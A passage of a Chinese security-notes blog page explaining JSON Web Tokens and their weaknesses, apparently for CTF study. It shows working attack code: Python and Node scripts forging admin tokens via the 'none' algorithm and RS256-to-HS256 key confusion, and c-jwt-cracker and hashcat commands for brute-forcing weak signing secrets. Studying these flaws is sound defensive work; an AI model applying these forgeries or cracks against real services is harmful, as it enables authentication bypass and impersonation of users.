</span></span><span style="display:flex;"><span><span style="color:#ff636f">with</span> <span style="color:#58a1dd">requests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">session</span>() <span style="color:#ff636f">as</span> <span style="color:#58a1dd">session</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">t1</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">threading</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">Thread</span>(<span style="color:#58a1dd">target</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">POST</span>, <span style="color:#58a1dd">args</span><span style="color:#ff636f">=</span>(<span style="color:#58a1dd">session</span>, ))
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">t1</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">daemon</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">t1</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">start</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">READ</span>(<span style="color:#58a1dd">session</span>)</span></span></code></pre></div><h1 id="token" class="heading-element"><span>Token</span>
  <a href="#token" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h1><h2 id="jwt" class="heading-element"><span>jwt</span>
  <a href="#jwt" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html"target="_blank" rel="external nofollow noopener noreferrer">http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html</a></p>
<p><code>JSON Web Token</code>由三部分组成，是目前最流行的跨域身份验证解决方案,它们之间用圆点(.)连接。这三部分分别是：</p>
<ul>
<li>
<p>Header</p>
<blockquote>
<p>{
&ldquo;alg&rdquo;: &ldquo;HS256&rdquo;,
&ldquo;typ&rdquo;: &ldquo;JWT&rdquo;
}</p>
</blockquote>
</li>
<li>
<p>Payload</p>
</li>
<li>
<p>Signature</p>
<blockquote>
<p>HMACSHA256(base64UrlEncode(header) + &ldquo;.&rdquo; + base64UrlEncode(payload), secret)</p>
<p>Base64 有三个字符<code>+</code>、<code>/</code>和<code>=</code>，在 URL 里面有特殊含义，所以要被替换掉：<code>=</code>被省略、<code>+</code>替换成<code>-</code>，<code>/</code>替换成<code>_</code> 。这就是 Base64URL 算法。</p>
</blockquote>
</li>
</ul>
<blockquote>
<p><code>JWT与Session的异同</code></p>
<p>相同点是，它们都是存储用户信息；然而，Session是在服务器端的，而JWT是在客户端的。</p>
<p>Session方式存储用户信息的最大问题在于要==占用大量服务器内存==，增加服务器的开销,而JWT方式将用户状态分散到了客户端中，可以明显减轻服务端的内存压力。</p>
<p>Session的状态是存储在服务器端，客户端只有session id的cookie；但是如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session，一种解决方案是 session 数据持久化，写入数据库或别的持久层，缺点是工程量比较大，另外，持久层也有挂掉的风险，另一种方案是==服务器索性不保存 session 数据了，所有数据都保存在客户端==，每次请求都发回服务器。JWT 就是这种方案的一个代表。</p>
<p><code>JWT缺陷</code></p>
<p>JWT 的最大缺点是，由于服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或者更改 token 的权限。也就是说，一旦 JWT 签发了，在到期之前就会始终有效，除非服务器部署额外的逻辑。（也就是说一个用户在手机A中登录了，然后又在手机B中登录，在过期之前手机A和B都可以登录，无法做到B登录后让A过期，如果要做到这点，就必须让服务器维护一个清单（记录该账号是否已经签发token），这样又回到session的老路了）</p>
<p>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</p>
<p>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</p>
</blockquote>
<h3 id="利用1修改加密算法" class="heading-element"><span>利用1：修改加密算法</span>
  <a href="#%e5%88%a9%e7%94%a81%e4%bf%ae%e6%94%b9%e5%8a%a0%e5%af%86%e7%ae%97%e6%b3%95" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ul>
<li><code>改为none</code></li>
</ul>
<p>用none算法生成的JWT==只有两部分==了，根本连签名都不存在。</p>
<p>JWT签名算法可确保JWT在传输过程中不会被恶意用户所篡改，但头部的alg字段可以改为none，若服务器支持签名算法为none，服务器会在JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p>
<p>设定该功能的最初目的是为了方便调试。但是，若不在生产环境中关闭该功能，攻击者可以通过将 alg 字段设置为 “None” 来伪造他们想要的任何 token，接着便可以使用伪造的 token 冒充任意用户登陆网站。</p>
<p><strong>解密，我可以通过传入不存在的id，让secret为undefined,导致algorithm为none,然后就可以通过伪造jwt来成为admin</strong></p>
<p><code>poc</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#pip3 install pyjwt</span>
</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">jwt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">token</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">jwt</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">encode</span>({<span style="color:#a6be9d">&#34;secretid&#34;</span>:<span style="color:#a6be9d">&#34;&#34;</span>,<span style="color:#a6be9d">&#34;username&#34;</span>:<span style="color:#a6be9d">&#34;admin&#34;</span>,<span style="color:#a6be9d">&#34;password&#34;</span>:<span style="color:#a6be9d">&#34;123456&#34;</span>,<span style="color:#a6be9d">&#34;iat&#34;</span>:<span style="color:#a6be9d">1587367857</span>},<span style="color:#58a1dd">algorithm</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;none&#34;</span>,<span style="color:#58a1dd">key</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;&#34;</span>)<span style="color:#ff636f">.</span><span style="color:#58a1dd">decode</span>(<span style="color:#58a1dd">encoding</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#39;utf-8&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">token</span>)</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">jwt</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># payload</span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">token_dict</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6be9d">&#34;iss&#34;</span>: <span style="color:#a6be9d">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">headers</span> <span style="color:#ff636f">=</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#a6be9d">&#34;alg&#34;</span>: <span style="color:#a6be9d">&#34;none&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#a6be9d">&#34;typ&#34;</span>: <span style="color:#a6be9d">&#34;JWT&#34;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">jwt_token</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">jwt</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">encode</span>(<span style="color:#58a1dd">token_dict</span>,  		<span style="color:#828b96;font-style:italic"># payload, 有效载体</span>
</span></span><span style="display:flex;"><span>                       <span style="color:#a6be9d">&#34;&#34;</span>,  				<span style="color:#828b96;font-style:italic"># 进行加密签名的密钥</span>
</span></span><span style="display:flex;"><span>                       <span style="color:#58a1dd">algorithm</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;none&#34;</span>,  	 <span style="color:#828b96;font-style:italic"># 指明签名算法方式, 默认也是HS256</span>
</span></span><span style="display:flex;"><span>                       <span style="color:#58a1dd">headers</span><span style="color:#ff636f">=</span><span style="color:#58a1dd">headers</span> 
</span></span><span style="display:flex;"><span>                       <span style="color:#828b96;font-style:italic"># json web token 数据结构包含两部分, payload(有效载体), headers(标头)</span>
</span></span><span style="display:flex;"><span>                       )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">jwt_token</span>)</span></span></code></pre></div><ul>
<li><code>修改RS256算法为HS256：</code><strong>（非对称密码算法=&gt;对称密码算法）</strong></li>
</ul>
<p>HS256算法使用密钥为所有消息进行签名和验证，而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。</p>
<p>如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。</p>
<p>如果它的公钥泄露的话，我们可以尝试将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。这样的话，后端代码使用RSA公钥+HS256算法进行签名验证。</p>
<p><code>node脚本</code></p>
<p>写这个js文件，然后执行 <code>node  &quot;xxx.js&quot;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">const</span> <span style="color:#58a1dd">jwt</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;jsonwebtoken&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var</span> <span style="color:#58a1dd">fs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">require</span>(<span style="color:#a6be9d">&#39;fs&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var</span> <span style="color:#58a1dd">privateKey</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">fs</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">readFileSync</span>(<span style="color:#a6be9d">&#39;public.key&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">var</span> <span style="color:#58a1dd">token</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">jwt</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">sign</span>({ <span style="color:#58a1dd">user</span>: <span style="color:#a6be9d">&#39;admin&#39;</span> }, <span style="color:#58a1dd">privateKey</span>, { <span style="color:#58a1dd">algorithm</span>: <span style="color:#a6be9d">&#39;HS256&#39;</span> });
</span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">token</span>)</span></span></code></pre></div><h3 id="利用2爆破密钥" class="heading-element"><span>利用2：爆破密钥</span>
  <a href="#%e5%88%a9%e7%94%a82%e7%88%86%e7%a0%b4%e5%af%86%e9%92%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥，例如将密钥字符串用作PyJWT库示例代码中的密钥的时候，情况就是如此。</p>
<p>字典https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt</p>
<ul>
<li>
<p><code>c-jwt-cracker</code></p>
<p><a href="https://github.com/brendan-rius/c-jwt-cracker"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/brendan-rius/c-jwt-cracker</a></p>
<p>这里用docker用法</p>
<blockquote>
<p>cd到安装目录执行docker build . -t jwtcrack</p>
<p>利用Docker来构建一个镜像并为该镜像命名为jwtcrack</p>
<ul>
<li><code>docker build</code>: 这是Docker命令，用于构建一个镜像。</li>
<li><code>.</code>: 这表示当前目录，它告诉Docker在当前目录下查找Dockerfile文件，Dockerfile文件包含了构建镜像的指令。</li>
<li><code>-t jwtcrack</code>: 这是一个标签参数，用于为构建的镜像指定一个名称，这里我们将其命名为<code>jwtcrack</code>。</li>
</ul>
</blockquote>
<!-- raw HTML omitted -->
<p>爆破</p>
<blockquote>
<ul>
<li><code>docker run</code>: 这是Docker命令，用于运行一个容器。</li>
<li><code>-it</code>: 这是两个参数的组合，<code>-i</code>表示交互式运行容器，<code>-t</code>表示为容器分配一个伪终端（pseudo-TTY）。</li>
<li><code>--rm</code>: 这是一个参数，表示容器退出后自动删除容器。这样可以在容器停止后清理资源，避免占用空间。</li>
<li><code>jwtcrack</code>: 这是之前构建的镜像的名称，用于指定要运行的容器的基础镜像。</li>
</ul>
<p>docker run -it &ndash;rm  jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTYzMjgzODk1MiwiZXhwIjoxNjMyODQ2MTUyLCJuYmYiOjE2MzI4Mzg5NTIsInN1YiI6InVzZXIiLCJqdGkiOiI5M2QwODg0MTU5MzQ5MWJiMDc1NzZkNDI5NzFkODIyZSJ9.VlGkcoMcfvtRYv2kMczlfD8ns1hpN2pArD5PdrVgO6I</p>
</blockquote>
<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303171244191.png" alt="image-20230317124444129" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303171244191.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303171244191.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303171244191.png?size=large 2x" data-title="image-20230317124444129" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
</li>
<li>
<p><code>hashcat</code></p>
<p>参数</p>
<blockquote>
<p>-m  哈希类别</p>
<p>-n  线程数</p>
<p>-a  攻击模式，其值参考后面对参数。“-a 0”字典攻击，“-a 1” 组合攻击；“-a 3”掩码攻击。</p>
<blockquote>
<p>?d代表数字，可以换成小写字母?l，大写字母?u，特殊字符?s，大小写字母+特殊字符?a，–O表示最优化破解模式，可以加该参数，也可以不加该参数。</p>
<p>现在纯数字或者纯字母的密码是比较少见的，根据密码专家对泄漏密码的分析，90%的个人密码是字母和数字的组合，可以是自定义字符了来进行暴力破解，Hashcat支持4个自定义字符集，分别是 -1 -2 -3 -4。定义时只需要这样-2  ?l?d ，然后就可以在后面指定?2，?2表示小写字母和数字。这时候要破解一个8位混合的小写字母加数字：</p>
<p>Hashcat.exe -a 3 &ndash;force -2 ?l?d  hassh值或者hash文件  ?2?2?2?2?2?2?2?2</p>
</blockquote>
</blockquote>
<p>掩码</p>
<blockquote>
<p>hashcat -a 3 -m 16500 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.KQmLQ3oyd6NJkfAttkTl1PFR5fijDe3u-NUJJDgOPrA -1 1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM  ?1?1?1?1?1</p>
</blockquote>
<p>字典</p>
<blockquote>
<p>hashcat   -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2NzY1Njk0MiwiZXhwIjoxNjY3NjY0MTQyLCJuYmYiOjE2Njc2NTY5NDIsInN1YiI6InVzZXIiLCJqdGkiOiJkODMwMGU0MWJkZWI5Y2M1MjIzNzgxMDdkMDE2MzlhOCJ9.lYnVCfleYbtGCZMTtBlRHPn2b9AKLLa2qSe7ksQb53o  -a 0 jwt-dicc.txt</p>
</blockquote>
</li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E9%80%9A%E7%94%A8/" class="post-tag" title="Tags - 通用">通用</a><a href="/tags/%E7%BD%91%E7%BB%9C/" class="post-tag" title="Tags - 网络">网络</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/owasp/xss/126/" class="post-nav-item" rel="prev" title="CORS"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>CORS</a>
      <a href="/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%BC%80%E5%8F%91/75/" class="post-nav-item" rel="next" title="AWD平台搭建">AWD平台搭建<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <a href="https://statcounter.com/p13160737/?guest=1" target="_blank">全平台总访问统计</a>

<script type="text/javascript">
var sc_project=13160737;
var sc_invisible=0;
var sc_security="28c44c5c";
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" + scJsHost +
"statcounter.com/counter/counter.js'></"+"script>");
</script>

<noscript>
  <div class="statcounter">
    <a title="Web Analytics" href="https://statcounter.com/" target="_blank">
      <img class="statcounter"
           src="https://c.statcounter.com/13160737/0/28c44c5c/0/"
           alt="Web Analytics"
           referrerPolicy="no-referrer-when-downgrade">
    </a>
  </div>
</noscript>


    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024 - 2025</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
